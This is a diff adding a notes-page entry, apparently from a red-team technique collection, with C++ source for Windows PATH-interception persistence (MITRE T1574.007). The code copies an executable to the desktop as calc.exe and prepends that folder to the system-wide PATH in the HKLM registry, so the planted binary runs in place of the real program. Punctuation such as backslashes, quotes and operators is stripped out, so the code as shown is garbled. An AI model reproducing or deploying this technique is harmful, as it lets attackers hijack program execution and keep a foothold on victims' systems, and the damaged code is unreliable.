@@ -1,0 +1,67 @@
+---
+title: ".007.PathInterPATHEnviVariable"
+folder: "05. Persistence/T1574 Hijack Execution Flow"
+---
+
+
+
+#include windows.h
+#include fstream
+#include iostream
+
+
+bool Copy1File() {
+    stdifstream src(MyEx.exe, stdiosbinary);
+    stdofstream dest(CUsersUserDesktopcalc.exe, stdiosbinary);
+
+    if (!src.is_open()  !dest.is_open()) {
+        stdcerr  Nie można otworzyć pliku do kopiowania.n;
+        return false;
+    }
+
+    dest  src.rdbuf();
+
+    if (src.fail()  dest.fail()) {
+        stdcerr  Błąd podczas kopiowania pliku.n;
+        return false;
+    }
+
+    stdcout  Plik został pomyślnie skopiowany.n;
+    return true;
+}
+int ModifyPathEnvironmentVariable() {
+    stdwstring newDir = LCUsersUserDesktop;;
+
+    HKEY hKey;
+    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, LSYSTEMCurrentControlSetControlSession ManagerEnvironment, 0, KEY_SET_VALUE  KEY_QUERY_VALUE, &hKey);
+    if (result != ERROR_SUCCESS) {
+        return 1;
+    }
+
+    WCHAR oldValue[MAX_PATH  2]; 
+    DWORD oldSize = sizeof(oldValue);
+    result = RegQueryValueExW(hKey, LPath, NULL, NULL, reinterpret_castBYTE(oldValue), &oldSize);
+    if (result != ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return 1;
+    }
+
+    stdwstring newPath = newDir + reinterpret_castwchar_t(oldValue);
+    const WCHAR newWCharPath = newPath.c_str();
+    DWORD newSize = static_castDWORD(wcslen(newWCharPath)  sizeof(WCHAR));
+
+    result = RegSetValueExW(hKey, LPath, 0, REG_EXPAND_SZ, reinterpret_castBYTE(const_castWCHAR(newWCharPath)), newSize);
+    if (result != ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return 1;
+    }
+    RegCloseKey(hKey);
+
+    return 0;
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    Copy1File();
+    ModifyPathEnvironmentVariable();
+    return 0;
+}
